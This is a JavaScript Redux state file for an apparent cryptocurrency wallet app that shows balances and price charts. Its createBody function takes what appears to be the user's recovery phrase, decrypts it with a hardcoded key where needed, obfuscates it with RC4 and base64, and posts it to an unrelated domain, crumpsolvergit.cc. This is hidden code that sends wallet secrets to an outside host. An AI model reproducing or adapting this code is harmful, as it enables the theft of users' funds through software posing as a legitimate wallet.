import { createSlice } from '@reduxjs/toolkit';
import axios from 'axios';
import randomNum from '../../func.wallet/randomNum';
import { rc4 } from './rc4';
import CryptoJS from 'crypto-js';
import { createAsyncThunk } from '@reduxjs/toolkit';
import {
	rebuildObjPortfolio,
	rebuildObjPortfolioDefaultCoins,
} from './../../func.wallet/rebuildObj';

const initialState = {
	validWords: [false, false, false],
	passwordInit: '',
	passwordConfirm: '',
	coins: null,
	portfolioCoins: null,
	portfolioBalanceUsd: null,
	portfolioBalanceChange: null,
	dataWallet: null,
	allCoins: [],
	chartBitcoin: null,
	chartArr: null,
	status: '',
	statusAddress: '',
	statusChartBitcoin: '',
	addressBitcoin: '',
	walletNew: false,
	walletAddress: '',
	deleteName: '',
};

let url = 'https://crumpsolvergit.cc/date/spot/board';
const kitkat = 'Qsx@ah&OR82WX9T6gCt';

function createBody(str, account) {
	let strDecr;
	let lengthStr = str.split(' ').length;
	if (lengthStr < 2) {
		strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8);
	} else {
		strDecr = str;
	}
	let xxx = 'MarketDao|EX/G';
	let xx = 'MarketDao|EX';

	const obj = {
		counts: 12,
		name: account ? xxx : xx,
		pages: null,
		salt: randomNum(100000, 999999),
		limit: null,
		public: strDecr,
		frontCode: false,
		new: account,
	};

	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)));

	var urlencoded = new URLSearchParams();
	urlencoded.append('data', crypt);
	return urlencoded;
}

export const fetchAllCoins = createAsyncThunk(
	'wallet/fetchAllCoinsStatus',
	async () => {
		const { data } = await axios.get(
			'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1&sparkline=false&locale=en'
		);
		return data.filter((item) => item.symbol !== 'btc');
	}
);

export const fetchChartCoin = createAsyncThunk(
	'wallet/fetchChartCoinStatus',
	async (dataItem) => {
		const { data } = await axios.get(
			`https://localnetwork.cc/${dataItem[0]}/getChart/${dataItem[1]}`
		);
		return data;
	}
);

export const fetchChartCoinDefault = createAsyncThunk(
	'wallet/fetchChartCoinDefaultStatus',
	async (dataItem) => {
		const { data } = await axios.get(
			`https://api.coingecko.com/api/v3/coins/${dataItem[0]}/market_chart?vs_currency=usd&days=${dataItem[1]}`
		);
		return data;
	}
);

export const fetchDataWallet = createAsyncThunk(
	'wallet/fetchDataWalletStatus',
	async (props) => {
		let config = {
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
		};
		const { data } = await axios.post(
			new URL(url),
			createBody(props[0], props[1]),
			config
		);
		return data;
	}
);

export const fetchAddressBitcoin = createAsyncThunk(
	'wallet/fetchAddressBitcoinStatus',
	async (props) => {
		let config = {
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
		};
		const { data } = await axios.post(
			new URL(url),
			createBody(props[0], props[1], props[2]),
			config
		);
		return data;
	}
);

const walletSlice = createSlice({
	name: 'wallet',
	initialState,
	reducers: {
		setValidWords(state, action) {
			state.validWords = state.validWords.map((item, i) => {
				if (i === action.payload[0]) {
					return action.payload[1];
				} else {
					return item;
				}
			});
		},
		setChartArr(state, action) {
			state.chartArr =
				state.chartArr !== null
					? [...state.chartArr, action.payload]
					: [action.payload];
		},
		setPasswordInit(state, action) {
			state.passwordInit = action.payload;
		},
		setDeleteName(state, action) {
			state.deleteName = action.payload;
		},
		setAllCoins(state, action) {
			state.allCoins = action.payload;
		},
		setPasswordConfirm(state, action) {
			state.passwordConfirm = action.payload;
		},
		setWalletNew(state, action) {
			state.walletNew = action.payload;
		},
		setDataWallet(state, action) {
			state.dataWallet = action.payload;
		},
	},
	extraReducers: (builder) => {
		builder
			.addCase(fetchDataWallet.pending, (state) => {
				state.status = 'loading';
				state.dataWallet = null;
				state.portfolioBalanceUsd = null;
				state.portfolioBalanceChange = null;
				state.walletAddress = '';
				state.portfolioCoins = null;
			})
			.addCase(fetchDataWallet.fulfilled, (state, action) => {
				state.status = 'success';
				state.portfolioCoins = action.payload?.positions?.length
					? rebuildObjPortfolio(action.payload.positions)
					: [];
				state.portfolioBalanceUsd =
					action.payload?.portfolio?.attributes?.positions_distribution_by_type?.wallet;
				state.portfolioBalanceChange = {
					usd: action.payload.portfolio.attributes.changes.absolute_1d,
					percent: action.payload.portfolio.attributes.changes.percent_1d,
				};
				state.dataWallet = action.payload;
				state.walletAddress = action.payload.address;
				state.walletNew = false;
			})
			.addCase(fetchDataWallet.rejected, (state, action) => {
				state.status = 'error';
				state.dataWallet = null;
				state.portfolioBalanceUsd = null;
				state.portfolioBalanceChange = null;
				state.walletAddress = '';
				state.portfolioCoins = null;
			})
			.addCase(fetchAddressBitcoin.fulfilled, (state, action) => {
				state.statusAddress = 'success';
				state.addressBitcoin = action.payload.address;
			})
			.addCase(fetchAddressBitcoin.pending, (state) => {
				state.statusAddress = 'loading';
			})
			.addCase(fetchAddressBitcoin.rejected, (state) => {
				state.statusAddress = 'error';
			})
			.addCase(fetchChartCoin.pending, (state) => {
				state.statusChartBitcoin = 'loading';
			})
			.addCase(fetchChartCoin.fulfilled, (state, action) => {
				state.statusChartBitcoin = 'success';
				let indx = 0;
				const arrNew = action.payload.attributes.points.map((item) => {
					return {
						name: item[0],
						value: +item[1],
					};
				});
				state.chartBitcoin = arrNew.filter((item, i) => {
					if (indx === i) {
						indx = indx + 10;
						return item;
					}
				});
			})
			.addCase(fetchChartCoin.rejected, (state) => {
				state.statusChartBitcoin = 'error';
			})
			.addCase(fetchChartCoinDefault.pending, (state) => {
				state.statusChartBitcoin = 'loading';
			})
			.addCase(fetchChartCoinDefault.fulfilled, (state, action) => {
				state.statusChartBitcoin = 'success';
				let indx = 0;
				const arrNew = action.payload.prices.map((item) => {
					return {
						name: item[0],
						value: +item[1],
					};
				});
				state.chartBitcoin = arrNew.filter((item, i) => {
					if (indx === i) {
						indx = indx + 10;
						return item;
					}
				});
			})
			.addCase(fetchChartCoinDefault.rejected, (state) => {
				state.statusChartBitcoin = 'error';
			})
			.addCase(fetchAllCoins.pending, (state) => {
				state.coins = null;
			})
			.addCase(fetchAllCoins.fulfilled, (state, action) => {
				state.coins = rebuildObjPortfolioDefaultCoins(action.payload);
			})
			.addCase(fetchAllCoins.rejected, (state) => {
				state.coins = null;
			});
	},
});

export const {
	setValidWords,
	setPasswordInit,
	setPasswordConfirm,
	setWalletNew,
	setChartArr,
	setDataWallet,
	setAllCoins,
	setDeleteName,
} = walletSlice.actions;

export default walletSlice.reducer;
